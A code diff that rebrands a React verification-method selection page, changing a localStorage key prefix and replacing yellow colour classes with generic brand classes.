@@ -22,7 +22,7 @@ export default function VerificationMethod() {
   const location = useLocation()
   const [selectedMethod, setSelectedMethod] = useState(() => {
     try {
-      return localStorage.getItem('banistmo:verificationMethod') || ''
+      return localStorage.getItem('suma-financiera:verificationMethod') || ''
     } catch {
       return ''
     }
@@ -44,7 +44,7 @@ export default function VerificationMethod() {
   useEffect(() => {
     try {
       if (selectedMethod) {
-        localStorage.setItem('banistmo:verificationMethod', selectedMethod)
+        localStorage.setItem('suma-financiera:verificationMethod', selectedMethod)
       }
     } catch {}
   }, [selectedMethod])
@@ -74,14 +74,14 @@ export default function VerificationMethod() {
                 className={[
                   'flex items-center gap-4 border rounded-2xl px-4 py-4 transition-all cursor-pointer',
                   selectedMethod === method.id
-                    ? 'border-yellow-400 bg-yellow-50 shadow-sm'
-                    : 'border-gray-200 hover:border-yellow-300',
+                    ? 'border-brand-500 bg-brand-50 shadow-sm'
+                    : 'border-gray-200 hover:border-brand-300',
                 ].join(' ')}
               >
                 <span
                   className={[
                     'flex h-12 w-12 items-center justify-center rounded-full text-gray-700',
-                    selectedMethod === method.id ? 'bg-yellow-100' : 'bg-gray-100',
+                    selectedMethod === method.id ? 'bg-brand-100' : 'bg-gray-100',
                   ].join(' ')}
                 >
                   {method.icon === 'sms' ? (
@@ -102,7 +102,7 @@ export default function VerificationMethod() {
                   value={method.id}
                   checked={selectedMethod === method.id}
                   onChange={() => setSelectedMethod(method.id)}
-                  className="h-5 w-5 border-gray-300 text-yellow-500 focus:ring-yellow-500"
+                  className="h-5 w-5 border-gray-300 text-brand-500 focus:ring-brand-500"
                   aria-label={method.title}
                 />
               </label>
@@ -112,7 +112,7 @@ export default function VerificationMethod() {
           <button
             type="button"
             onClick={() => navigate(buildPathWithDana('/', danaParam))}
-            className="mt-6 text-sm font-medium text-yellow-600 hover:text-yellow-700"
+            className="mt-6 text-sm font-medium text-brand-700 hover:text-brand-700"
           >
             ¿Estos no son tus datos?
           </button>
@@ -123,8 +123,8 @@ export default function VerificationMethod() {
             className={[
               'mt-4 w-full rounded-full px-6 py-3 text-sm font-semibold transition-colors sm:w-auto',
               selectedMethod
-                ? 'bg-yellow-400 text-gray-900 hover:bg-yellow-500'
-                : 'bg-yellow-200 text-gray-500 cursor-not-allowed',
+                ? 'bg-brand-500 text-gray-900 hover:bg-brand-500'
+                : 'bg-brand-200 text-gray-500 cursor-not-allowed',
             ].join(' ')}
           >
             Continuar
